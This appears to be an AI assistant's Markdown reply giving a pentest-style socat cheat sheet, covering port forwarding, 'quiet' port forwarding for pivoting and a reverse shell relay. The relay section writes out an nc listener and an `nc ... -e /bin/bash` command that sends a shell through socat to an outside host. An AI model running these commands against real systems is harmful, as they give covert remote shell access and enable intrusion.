Here's your Socat guide, formatted for better readability on GitHub:

---

### Socat: A Multipurpose Relay Tool

Socat is a versatile relay tool that can be used for port forwarding.

#### Port Forwarding

Run the following command on your local machine:
```bash
socat tcp-listen:8080,fork tcp:<remote-ip>:80
```
With the command above, you can access [http://localhost:8080/](http://localhost:8080/) and get the content of the remote website.

#### Port Forwarding (from Remote Machine)

Run the following command on the remote machine:
```bash
socat tcp-listen:1234,fork,reuseaddr tcp:localhost:8080
```
With the command above, you can access `http://<remote-ip>:1234` on your local machine, and get the content of the remote 8080 port.

#### Quiet Port Forwarding

1. **Open Up Two Ports on Local Machine:**
   ```bash
   socat tcp-listen:<local-port> tcp-listen:<remote-port>,fork,reuseaddr &
   ```

2. **Make a Connection between Local Port and Remote Port:**

   On the remote machine:
   ```bash
   socat tcp:<local-ip>:<local-port> tcp:<remote-ip>:<remote-port>,fork &
   ```

3. **Confirmation on Your Local Machine:**

   For example, if `<remote-port>` is 8000 (HTTP), you can access `localhost:<remote-port>`.

4. **Stop Port Forwarding:**
   ```bash
   # Stop backgrounds
   jobs
   # kill %<NUMBER>
   kill %1
   ```

#### Reverse Shell Relay

1. **Open Listener on Your Local Machine:**
   ```bash
   nc -lvnp <local-port>
   ```

2. **Run Socat on Remote Machine:**
   ```bash
   ./socat tcp-l:8000 tcp:<local-ip>:<local-port> &
   nc 127.0.0.1 8000 -e /bin/bash
   ```

3. **Confirmation on Your Local Machine:**

   You can connect to the remote shell and confirm by running some commands, e.g.:
   ```bash
   whoami
   ```

4. **Stop Reverse Shell Relay:**
   ```bash
   # Stop backgrounds
   jobs
   # kill %<NUMBER>
   kill %1
   ```

#### References

- [How to Setup SSH Tunneling](https://linuxize.com/post/how-to-setup-ssh-tunneling/)

---

Hope this helps! 🚀
